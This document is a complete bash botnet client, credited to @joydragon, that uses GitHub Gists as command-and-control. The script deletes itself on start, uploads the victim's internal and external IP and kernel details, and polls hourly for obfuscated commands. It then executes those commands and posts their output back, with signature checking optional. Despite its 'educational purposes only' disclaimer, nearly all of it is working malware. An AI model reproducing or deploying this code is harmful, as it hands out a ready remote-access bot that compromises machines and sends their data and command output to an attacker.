#!/bin/bash

##############################################
# Simple bash botnet by @joydragon
# C2 on Github Gists
#
# This is intended for educational purposes only
# It is not perfect and it is not the intent
# If you can't see it, it's your fault :P
##############################################

##############################################
# Global Variables
URL_GIST=""
VERIFY="1"

##############################################
# Sleep timer in seconds (3600 = 1 hour)
SLEEP=3600

##############################################
# Github API token
TOK=""

##############################################
# RSA Public key
PUBLIC=""

##############################################
# Functions
##############################################

##############################################
# MSG ENCODING:
#	HEX -> REVERSE -> BASE64 -> HEX
##############################################
function enc {
	echo -e "$1" | xxd -p | paste -s -d "" - | rev | paste -s -d "" - | base64 | paste -s -d "" - | tr -d "=" | xxd -p | paste -d "" -s
}

##############################################
# MSG DECODING:
#	HEX -> BASE64 -> REVERSE -> HEX
##############################################
function dec {
	echo -e "$1" | xxd -r -p | base64 -id 2>/dev/null | rev | xxd -r -p
}

##############################################
# Message signature verification
function ver {
	if [ -n "${PUBLIC}" ]; then
		VAR=($(echo "$1" | tr ":" "\n"))
		if [ -n "${VAR[0]}" ] &&  [ -n "${VAR[1]}" ]; then
			echo -e ${VAR[0]} | openssl dgst -sha1 -verify <(echo -e "${PUBLIC}") -signature <(echo ${VAR[1]} | base64 -d)
		else
			echo "Failed"
		fi
	fi
}

##############################################
# Update data
function upd {
	if [ -z "$1" ]; then
		return
	fi
	RES=$(enc "$1");
	if [ -n "${URL_GIST}" ]; then
		URL_GIST=$(curl -s -X PATCH -H "Accept: application/vnd.github.v3+json" -H "Authorization: token ${TOK}" ${URL_GIST} -d  '{"public": false, "files": {"'$(date +%Y%m%d%H%M%Z)'.txt": { "content": "'${RES}'"} } }' | grep '"forks_url"' | sed -e "s/^.*https/https/" -e "s/\/forks.*$//");
	else
		URL_GIST=$(curl -s -X POST -H "Authorization: token ${TOK}" -H "Accept: application/vnd.github.v3+json" https://api.github.com/gists -d '{"public": false, "files": {"'$(date +%Y%m%d%H%M%Z)'.txt": { "content": "'${RES}'"} } }' | grep '"forks_url"'  | sed -e "s/^.*https/https/" -e "s/\/forks.*$//");
	fi
}
##############################################
# Receive communications
function com {
	if [ -n "${URL_GIST}" ]; then 
		URL2=$(curl -H "Authorization: token ${TOK}" "${URL_GIST}" -s | grep -e "/comm\"" | sed -e "s/^.*https/https/" -e 's/".*$//');
		if [ -n "${URL2}" ]; then 
			RES=$(curl -s -H "Authorization: token ${TOK}" "${URL2}");
			if [ "$VERIFY" == "0" ]; then
				curl -s -X POST -H "Authorization: token ${TOK}" -H "Accept: application/vnd.github.v3+json" ${URL_GIST} -d '{"public": false, "files": {"comm": { "content": ""} } }' > /dev/null
				COM=$($(dec "${RES}") 2>&1 );
				echo -e "${COM}";
			elif [[ "$(ver $RES)" == "Verified OK" ]]; then
				curl -s -X POST -H "Authorization: token ${TOK}" -H "Accept: application/vnd.github.v3+json" ${URL_GIST} -d '{"public": false, "files": {"comm": { "content": ""} } }' > /dev/null
				COM=$($(dec "${RES}") 2>&1 );
				echo -e "${COM}";
			fi
		fi;
	fi
}

##############################################
# MAIN
##############################################

##############################################
# Run and delete yourself
rm $(realpath "$0");

if [ -z "${TOK}" ]; then
	echo "ERROR: Github token not present"
	exit
fi

if [ -z "${PUBLIC}" ]; then
	echo "WARNING: Public key is not present, will rollback to unverified mode."
	VERIFY=0
fi

##############################################
# First step, register yourself (Internal IP; External IP; Linux Kernel
upd "$(hostname -I);$(nslookup myip.opendns.com resolver1.opendns.com | grep 'Address' | tail -n 1 | sed -e 's/Address:\s*//i');$(uname -a)"

##############################################
# Wait for commands
while true; do
	sleep ${SLEEP}
	upd "$(com)"
done;
